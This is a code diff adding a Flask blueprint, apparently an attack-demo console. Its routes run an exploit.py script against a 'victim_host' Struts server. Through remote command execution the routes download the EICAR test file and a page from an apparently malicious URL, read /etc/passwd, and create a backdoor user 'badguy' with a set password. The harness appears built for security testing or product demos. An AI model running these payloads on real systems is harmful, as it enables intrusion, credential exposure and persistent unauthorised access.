@@ -1,0 +1,119 @@
+from flask import render_template, Blueprint, flash, redirect, url_for, current_app
+import subprocess
+
+###################################################################################
+# NOTES:
+#
+# If using Dockerfile, the python path will need to be changed to /usr/local/bin/python
+#
+# Need to dynamically read in the value for "victim_host"
+#
+###################################################################################
+
+victim_host = "127.0.0.1"
+
+main_blueprint = Blueprint(
+    'main',
+    __name__,
+    template_folder='../templates/main'
+)
+
+def format_output(output):
+    return str(output.decode("utf-8"))
+
+@main_blueprint.route('/')
+def home():
+    return render_template('index.html')
+
+
+@main_blueprint.route('/ping') 
+def ping():
+    #output = "fake output"
+    try:
+        output = subprocess.check_output(["ping", "-c", "1", "8.8.8.8"])
+        flash("The command ran successfully", category="success")
+    except subprocess.CalledProcessError as e:
+        flash("An error occurred", category="warning")
+        output = "An error occurred:\n {e}".format(e=e)
+    return render_template('struts.html', output=format_output(output))
+
+
+@main_blueprint.route('/ping_localhost') 
+def ping_localhost():
+    #output = "fake output"
+    try:
+        output = subprocess.check_output(["ping", "-c", "1", "127.0.0.1"])
+        flash("The command ran successfully", category="success")
+    except subprocess.CalledProcessError as e:
+        flash("An error occurred", category="warning")
+        output = "An error occurred:\n {e}".format(e=e)
+    return render_template('struts.html', output=format_output(output))
+
+
+@main_blueprint.route('/struts_eicar') 
+def struts_eicar():
+    #output = "fake output"
+    try:
+        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:8081/hello".format(victim_host=victim_host), "wget http://www.eicar.org/download/eicar.com -O /tmp/eicar.com"])
+        flash("The command ran successfully", category="success")
+    except subprocess.CalledProcessError as e:
+        flash("An error occurred", category="warning")
+        output = "An error occurred:\n {e}".format(e=e)
+    return render_template('struts.html', output=format_output(output))
+
+
+@main_blueprint.route('/struts_eicar_https') 
+def struts_eicar_https():
+    #output = "fake output"
+    try:
+        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:8081/hello".format(victim_host=victim_host), "apk add --update openssl; wget https://secure.eicar.org/eicar.com -O /tmp/eicar.com"])
+        flash("The command ran successfully", category="success")
+    except subprocess.CalledProcessError as e:
+        flash("An error occurred", category="warning")
+        output = "An error occurred:\n {e}".format(e=e)
+    return render_template('struts.html', output=format_output(output))
+
+
+@main_blueprint.route('/struts_mal_url') 
+def struts_mal_url():
+    #output = "fake output"
+    try:
+        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:8081/hello".format(victim_host=victim_host), "wget http://wrs21.winshipway.com -O index.html"])
+        flash("The command ran successfully", category="success")
+    except subprocess.CalledProcessError as e:
+        flash("An error occurred", category="warning")
+        output = "An error occurred:\n {e}".format(e=e)
+    return render_template('struts.html', output=format_output(output))
+
+
+
+@main_blueprint.route('/struts_list_users') 
+def struts_list_users():
+    #output = "fake output"
+    try:
+        target = "http://{victim_host}:8081/hello".format(victim_host=victim_host)
+        output = subprocess.check_output(["/usr/bin/python", "exploit.py", target, "cat /etc/passwd"])
+        flash("The command ran successfully", category="success")
+    except subprocess.CalledProcessError as e:
+        flash("An error occurred", category="warning")
+        output = "An error occurred:\n {e}".format(e=e)
+    return render_template('struts.html', output=format_output(output))
+
+
+
+@main_blueprint.route('/struts_create_user') 
+def struts_create_user():
+    #output = "fake output"
+    try:
+        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:8081/hello".format(victim_host=victim_host), 'adduser -D badguy; echo "badguy:newpass" | chpasswd'])
+        flash("The command ran successfully", category="success")
+    except subprocess.CalledProcessError as e:
+        flash("An error occurred", category="warning")
+        output = "An error occurred:\n {e}".format(e=e)
+    return render_template('struts.html', output=format_output(output))
+
+
+
+
+
+    
